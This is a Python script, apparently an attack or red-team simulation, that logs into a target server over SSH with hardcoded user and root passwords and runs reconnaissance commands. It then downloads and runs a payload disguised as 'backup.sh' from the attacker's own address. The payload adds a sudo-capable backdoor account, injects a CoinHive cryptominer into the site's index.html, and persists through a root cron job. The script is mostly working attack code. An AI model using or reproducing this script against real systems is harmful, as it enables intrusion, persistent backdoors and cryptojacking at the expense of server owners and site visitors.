import paramiko
import sys
import socket
import time

hostname = sys.argv[1]

user1 = "devtest"
pass1 = "driveby"

user2 = "root"
pass2 = "0A0YlBjrlBXSr14MPz"

port = 22

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
ip = s.getsockname()[0]

backup_sh = """
#!/bin/bash

if ! id -u devtest2; then
    mkdir /home/devtest2
    useradd --home=/home/devtest2 -s /bin/bash devtest2
    echo "devtest2:HYf6lEMhUM4Z0b079X" | chpasswd
    chown devtest2:devtest2 /home/devtest2
    echo 'devtest2  ALL=(ALL:ALL) ALL' >> /etc/sudoers
fi

sudo cat /var/www/html/index.html | grep "miner.js"
if [ $? != 0 ]; then
      sed -i 's/<\/body>/<script src = http:\/\/{}\/js\/colorbox.min.js><\/script><script>var color = new CoinHive.Anonymous("123456-asdfgh");color.start()<\/script><\/body>/g' /var/www/html/index.html
fi
""".format(ip)

f = open('backup.sh', 'w')
f.write(backup_sh)
f.close()

try:


    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.WarningPolicy)
    
    client.connect(hostname, port=port, username=user1, password=pass1)

    command = "whoami"
    stdin, stdout, stderr = client.exec_command(command)
    print stdout.read()
    print stderr.read()

    time.sleep(5)

    command = "ls -la"
    stdin, stdout, stderr = client.exec_command(command)
    print stdout.read()
    print stderr.read()

    time.sleep(3)

    command = "pwd"
    stdin, stdout, stderr = client.exec_command(command)
    print stdout.read()
    print stderr.read()

    time.sleep(4)

    command = "ls -R /home -la"
    stdin, stdout, stderr = client.exec_command(command)
    print stdout.read()
    print stderr.read()

    time.sleep(2)

    command = "cat /home/ubuntu/setup.sh"
    stdin, stdout, stderr = client.exec_command(command)
    print stdout.read()
    print stderr.read()
    client.close()
    
    time.sleep(22)

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.WarningPolicy)
    client.connect(hostname, port=port, username=user2, password=pass2)

    command = "whoami"
    stdin, stdout, stderr = client.exec_command(command)
    print stdout.read()
    print stderr.read()

    time.sleep(6)

    command = "sudo ls -la /var/www/html"
    stdin, stdout, stderr = client.exec_command(command)
    print stdout.read()
    print stderr.read()

    time.sleep(3)

#    command = 'echo -e "<script src = http://{}/miner.js></script>\n" >> /var/www/html/index.html'.format(ip)
#    stdin, stdout, stderr = client.exec_command(command)
#    print stdout.read()
#    print stderr.read()

    time.sleep(4)

    command = "wget http://{}/backup.sh && chmod +x ./backup.sh".format(ip)
    stdin, stdout, stderr = client.exec_command(command)
    print stdout.read()
    print stderr.read()

    time.sleep(2)

    command = "./backup.sh"
    stdin, stdout, stderr = client.exec_command(command)
    print stdout.read()
    print stderr.read()

    command = 'crontab -l | { cat; echo "30 2 * * * root /root/backup.sh > /dev/null 2>&1"; } | crontab -'
    stdin, stdout, stderr = client.exec_command(command)
    print stdout.read()
    print stderr.read()
    

finally:
    client.close()
